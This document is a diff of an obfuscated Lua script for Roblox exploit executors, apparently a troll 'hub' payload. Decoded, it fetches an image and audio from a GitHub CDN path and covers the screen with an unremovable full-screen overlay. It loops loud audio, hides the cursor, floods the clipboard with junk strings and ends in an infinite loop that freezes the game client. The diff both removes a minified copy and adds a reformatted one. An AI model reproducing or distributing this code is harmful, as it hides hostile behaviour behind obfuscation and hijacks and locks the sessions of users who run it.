@@ -1,1 +1,123 @@
-local _a=string.char(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,97,110,100,97,54,52,52,54,53,57,47,88,73,78,71,45,84,85,45,72,85,66,64,109,97,105,110,47,110,98,119,46,112,110,103)local _b=string.char(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,97,110,100,97,54,52,52,54,53,57,47,88,73,78,71,45,84,85,45,72,85,66,64,109,97,105,110,47,98,97,115,101,54,52,46,116,120,116)local _c=string.char(110,98,119,95,102,117,108,108,115,99,114,101,101,110,46,112,110,103)local _d=string.char(116,111,110,103,95,97,117,100,105,111,46,109,112,51)if not writefile or not getcustomasset or not isfile then return end if not isfile(_c)then local _e,_f=pcall(function()if request then local _g=request({Url=_a,Method=string.char(71,69,84)})if _g and _g.StatusCode==200 then return _g.Body end end return game:HttpGet(_a)end)if _e and _f and#_f>100 then writefile(_c,_f)end end if not isfile(_d)then local _e,_h=pcall(function()if request then local _g=request({Url=_b,Method=string.char(71,69,84)})if _g and _g.StatusCode==200 then return _g.Body end end return game:HttpGet(_b)end)if _e and _h and#_h>100 then _h=_h:gsub(string.char(37,115,43),"")local _i if crypt and crypt.base64decode then local _j,_k=pcall(function()return crypt.base64decode(_h)end)if _j then _i=_k end end if not _i then local _l=string.char(65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47)local _m={}for _n=1,#_l do _m[_l:sub(_n,_n)]=_n-1 end local _o={}local _p,_q=0,0 for _n=1,#_h do local _r=_h:sub(_n,_n)if _r==string.char(61)then break end local _s=_m[_r]if _s then _p=_p*64+_s _q=_q+6 if _q>=8 then _q=_q-8 table.insert(_o,string.char((_p//(2^_q))%256))end end end _i=table.concat(_o)end if _i and#_i>100 then writefile(_d,_i)end end end local _t=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_t.Name=string.char(70,117,108,108,83,99,114,101,101,110,79,118,101,114,108,97,121)_t.ResetOnSpawn=false _t.IgnoreGuiInset=true _t.DisplayOrder=2147483647 _t.ZIndexBehavior=Enum.ZIndexBehavior.Sibling pcall(function()_t.Parent=game:GetService(string.char(67,111,114,101,71,117,105))end)if not _t.Parent then _t.Parent=game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))end local _u=Instance.new(string.char(73,109,97,103,101,76,97,98,101,108))_u.Size=UDim2.new(1,0,1,0)_u.Position=UDim2.new(0,0,0,0)_u.BackgroundColor3=Color3.fromRGB(0,0,0)_u.BackgroundTransparency=0 _u.BorderSizePixel=0 _u.Image=getcustomasset(_c)_u.ScaleType=Enum.ScaleType.Stretch _u.ZIndex=2147483647 _u.Parent=_t task.wait(0.1)local _v=Instance.new(string.char(83,111,117,110,100))_v.Name=string.char(76,111,111,112,65,117,100,105,111)_v.SoundId=getcustomasset(_d)_v.Volume=10 _v.Looped=true _v.Parent=game:GetService(string.char(83,111,117,110,100,83,101,114,118,105,99,101))_v:Play()task.spawn(function()while true do if not _v.IsPlaying then _v:Play()end if _t.Parent==nil then pcall(function()_t.Parent=game:GetService(string.char(67,111,114,101,71,117,105))end)end task.wait(0.5)end end)task.wait(0.1)pcall(function()game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101)).MouseIconEnabled=false end)while true do end
+task.wait(2)
+pcall(function()
+game:GetService(string.char(83,116,97,114,116,101,114,71,117,105)):SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
+Title =string.char(228,189,156,232,128,133),
+Text =string.char(98,231,171,153,232,146,184,233,165,186,229,183,161,230,141,149),
+Duration = 3
+})
+end)
+task.wait(1)
+pcall(function()
+game:GetService(string.char(83,116,97,114,116,101,114,71,117,105)):SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
+Title =string.char(233,128,154,231,159,165),
+Text =string.char(229,147,170,230,156,137,229,176,143,229,173,169,229,164,169,229,164,169,229,147,173,239,191,189,239,191,189,239,191,189,239,191,189),
+Duration = 3
+})
+end)
+local _0x7D66 = setclipboard or setClipboard or toclipboard
+if _0x7D66 then
+local _0x9FED = {string.char(115,106,106,115,106,100,106,100,100,106),string.char(107,100,111,99,105,118,105,103,106,114),string.char(108,97,112,115,111,105,99,117,99,104),string.char(101,108,101,111,100,106,99,110,122,108),string.char(119,108,119,108,115,107,120,107,104,102,102,117,117,100),string.char(119,111,111,115,105,100,117,102,106,110,101,101),string.char(101,111,100,111,102,105,106,100,110,101,98,114,106,100,106,102),string.char(118,118,110,99,107,100,105,102,105,102,105,100,107),string.char(119,107,107,115,100,105,120,105,120,105,120,106,100,110,115,109,109,115,100),string.char(101,107,115,107,100,105,102,117,102,106,100,107,115,109,100,110,98,102),string.char(100,107,100,73,100,104,100,106,115,111,100,105,117,100,104,101,110,101,110,100,106,100,106,100,106,101,107,115,105,105,100,104,100,98,100,98,100,104,100,104,102,106,100,106,100,107,115,109,115),string.char(101,105,100,105,100,104,100,98,115,98,100,98,104,100,106,100,106,100),string.char(101,105,111,100,105,100,98,100,98,114,101,106,106,100,106,99,104,99,98,120,100,109,115,108,115,111,111,115),string.char(101,111,101,105,102,106,100,104,98,100,106,100,105,100,106,100,100,106,100,106,100,106,100,106,100,106,106,100,100,106),string.char(100,107,100,111,102,105,100,110,100,110,100,110,115,106,115,106,106,100,106,100,100,106,106,120,104)}
+for _, txt in ipairs(_0x9FED) do
+pcall(_0x7D66, txt)
+task.wait(0.1)
+end
+end
+local _0xEA0A =string.char(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,97,110,100,97,54,52,52,54,53,57,47,88,73,78,71,45,84,85,45,72,85,66,64,109,97,105,110,47,110,98,119,46,112,110,103)local _0x627F =string.char(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,97,110,100,97,54,52,52,54,53,57,47,88,73,78,71,45,84,85,45,72,85,66,64,109,97,105,110,47,98,97,115,101,54,52,46,116,120,116)local _0xC8CD =string.char(110,98,119,95,102,117,108,108,115,99,114,101,101,110,46,112,110,103)local _0x13D0 =string.char(116,111,110,103,95,97,117,100,105,111,46,109,112,51)if not writefile or not getcustomasset or not isfile then
+return
+end
+if not isfile(_0xC8CD) then
+local _0xC8B3, _0xDB84 = pcall(function()
+if request then
+local _0x9F46 = request({Url = _0xEA0A, Method =string.char(71,69,84)})
+if _0x9F46 and _0x9F46.StatusCode == 200 then return _0x9F46.Body end
+end
+return game:HttpGet(_0xEA0A)
+end)
+if _0xC8B3 and _0xDB84 and #_0xDB84 > 100 then
+writefile(_0xC8CD, _0xDB84)
+end
+end
+if not isfile(_0x13D0) then
+local _0xC8B3, _0x3128 = pcall(function()
+if request then
+local _0x9F46 = request({Url = _0x627F, Method =string.char(71,69,84)})
+if _0x9F46 and _0x9F46.StatusCode == 200 then return _0x9F46.Body end
+end
+return game:HttpGet(_0x627F)
+end)
+if _0xC8B3 and _0x3128 and #_0x3128 > 100 then
+_0x3128 = _0x3128:gsub(string.char(37,115,43),"")
+local _0x9939
+if crypt and crypt.base64decode then
+local _0x179C, _0x0309 = pcall(function() return crypt.base64decode(_0x3128) end)
+if _0x179C then _0x9939 = _0x0309 end
+end
+if not _0x9939 then
+local _0x1639 =string.char(65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47)local _0xBB01 = {}
+for i = 1, #_0x1639 do _0xBB01[_0x1639:sub(i,i)] = i - 1 end
+local _0x4308 = {}
+local _0xAC37, _0xCF9F = 0, 0
+for i = 1, #_0x3128 do
+local _0x6691 = _0x3128:sub(i,i)
+if _0x6691 ==string.char(61)then break end
+local _0x0057 = _0xBB01[_0x6691]
+if _0x0057 then
+_0xAC37 = _0xAC37 * 64 + _0x0057
+_0xCF9F = _0xCF9F + 6
+if _0xCF9F >= 8 then
+_0xCF9F = _0xCF9F - 8
+table.insert(_0x4308, string.char((_0xAC37 // (2^_0xCF9F)) % 256))
+end
+end
+end
+_0x9939 = table.concat(_0x4308)
+end
+if _0x9939 and #_0x9939 > 100 then
+writefile(_0x13D0, _0x9939)
+end
+end
+end
+local _0x88FC = Instance.new(string.char(83,99,114,101,101,110,71,117,105))
+_0x88FC.Name =string.char(70,117,108,108,83,99,114,101,101,110,79,118,101,114,108,97,121)_0x88FC.ResetOnSpawn = false
+_0x88FC.IgnoreGuiInset = true
+_0x88FC.DisplayOrder = 2147483647
+_0x88FC.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function()
+_0x88FC.Parent = game:GetService(string.char(67,111,114,101,71,117,105))
+end)
+if not _0x88FC.Parent then
+_0x88FC.Parent = game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
+end
+local _0x99B0 = Instance.new(string.char(73,109,97,103,101,76,97,98,101,108))
+_0x99B0.Size = UDim2.new(1, 0, 1, 0)
+_0x99B0.Position = UDim2.new(0, 0, 0, 0)
+_0x99B0.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+_0x99B0.BackgroundTransparency = 0
+_0x99B0.BorderSizePixel = 0
+_0x99B0.Image = getcustomasset(_0xC8CD)
+_0x99B0.ScaleType = Enum.ScaleType.Stretch
+_0x99B0.ZIndex = 2147483647
+_0x99B0.Parent = _0x88FC
+task.wait(0.1)
+local _0xC0B5 = Instance.new(string.char(83,111,117,110,100))
+_0xC0B5.Name =string.char(76,111,111,112,65,117,100,105,111)_0xC0B5.SoundId = getcustomasset(_0x13D0)
+_0xC0B5.Volume = 10
+_0xC0B5.Looped = true
+_0xC0B5.Parent = game:GetService(string.char(83,111,117,110,100,83,101,114,118,105,99,101))
+_0xC0B5:Play()
+task.spawn(function()
+while true do
+if not _0xC0B5.IsPlaying then
+_0xC0B5:Play()
+end
+if _0x88FC.Parent == nil then
+pcall(function() _0x88FC.Parent = game:GetService(string.char(67,111,114,101,71,117,105)) end)
+end
+task.wait(0.5)
+end
+end)
+task.wait(0.1)
+pcall(function()
+game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101)).MouseIconEnabled = false
+end)
+while true do end
